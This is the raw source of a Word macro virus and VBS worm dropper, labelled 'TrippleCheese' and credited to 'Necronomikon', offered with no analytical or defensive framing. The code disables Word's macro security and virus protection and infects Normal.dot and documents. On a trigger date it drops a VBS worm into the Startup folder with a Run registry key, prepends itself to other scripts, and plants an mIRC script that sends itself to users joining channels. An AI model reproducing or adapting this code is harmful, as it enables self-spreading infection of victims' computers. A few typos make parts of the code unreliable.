On Error Resume Next
'HTML.TrippleCheese-Wordmacro.Dropper
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Ofice\9.0\Word\Security", "Level") <> "" Then
CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Else
CommandBars("Tools").Controls("Macro").Delete
Options.ConfirmConversions = (1 - 1): Options.VirusProtection = (1 - 1): Options.SaveNormalPrompt = (1 - 1)
End If
tripple= ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
Application.EnableCancelKey = 0
Options.ConfirmConversions = 0
cheese= NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If tripple > 0 and cheese > 0 then goto food
If tripple = 0 Then 
set KKS = ActiveDocument.VBProject.VBComponents.Item(1)
DE82 = TRUE
End If
If cheese = 0 Then 
set KKS = NormalTemplate.VBProject.VBComponents.Item(1)
NEC = TRUE
End If
If NEC <> TRUE and DE82 <> TRUE then goto food
If NEC = TRUE then KKS.CodeModule.AddFromString ("Sub Document_Close()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, tripple - 1))
If DE82 = TRUE Then KKS.CodeModule.AddFromString ("Sub Document_Open()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, cheese - 1))
If Month(Now) = 12  and Day(Now) = 14 Then 
Open "c:\windows\startm~1\progra~1\autost~1\TrippleCheese.vbs" For Output As 1
Print #1, " 'trip"
Print #1, " 'HTML.TrippleCheese-VBS.Dropper by Necronomikon"
Print #1, "Set ws = CreateObject(""WScript.Shell"")"
Print #1, "ws.regwrite ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Worm"", ""wscript.exe c:\windows\startm~1\progra~1\autost~1\TrippleCheese.vbs %""
Print #1, " Set FSO = CreateObject(""Scripting.FileSystemObject"")"
Print #1, " Set OpenSelf = FSO.OpenTextFile(Wscript.ScriptFullName, 1, True)"
Print #1, " Self = OpenSelf.Read(753)"
Print #1, " Set CurrentDirectory = FSO.GetFolder(""."").Files"
Print #1, " For Each ScriptFiles In CurrentDirectory"
Print #1, " ExtName = LCase(FSO.GetExtensionName(ScriptFiles.Path))"
Print #1, " If ExtName = ""vbs"" Or ExtName = ""vbe"" Then"
Print #1, " Set Scripts = FSO.OpenTextFile(ScriptFiles.Path, 1, True)"
Print #1, " If Scripts.ReadLine <> ""'trip"" Then"
Print #1, " Set Scripts = FSO.OpenTextFile(ScriptFiles.Path, 1, True)"
Print #1, " ScriptsSource = Scripts.ReadAll"
Print #1, " Set WriteScripts = FSO.OpenTextFile(ScriptFiles.Path, 2, True)"
Print #1, " WriteScripts.WriteLine Self"
Print #1, " WriteScripts.WriteLine ScriptsSource"
Print #1, " End If"
Print #1, " End If"
Print #1, " Next"
Print #1, "Function Mirc(Path)"
Print #1, "On Error Resume Next"
Print #1, "Set fso = CreateObject(""scripting.filesystemobject"")"
Print #1, "Set ws = CreateObject(""wscript.shell"")"
Print #1, "If Path = "" Then"
Print #1, "If fso.fileexists(""c:\mirc\mirc.ini"") Then Path = ""c:\mirc"""
Print #1, "If fso.fileexists(""c:\mirc32\mirc.ini"") Then Path = ""c:\mirc32"""
Print #1, "PfDir = ws.regread(""HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir"")"
Print #1, "If fso.fileexists(PfDir & ""\mirc\mirc.ini"") Then Path = PfDir & ""\mirc"""
Print #1, "End If"
Print #1, "If Path <> "" Then"
Print #1, "Set Script = fso.CreateTextFile(Path & ""\script.ini"", True)"
Print #1, "Script.writeline ""[script]"
Print #1, "Script.writeline ""n0=on 1:JOIN:#:{"
Print #1, "Script.writeline ""n1=  /if ( $nick == $me ) { halt }"
Print #1, "Script.writeline ""n2=  /." & Chr(100) & Chr(99) & Chr(99) & " send $nick c:\windows\startm~1\progra~1\autost~1\TrippleCheese.vbs"
Print #1, "Script.writeline ""n3=}"
Print #1, "Script.Close"
Print #1, "End If"
Print #1, "End Function"
Close 1
End If
food:
End Sub
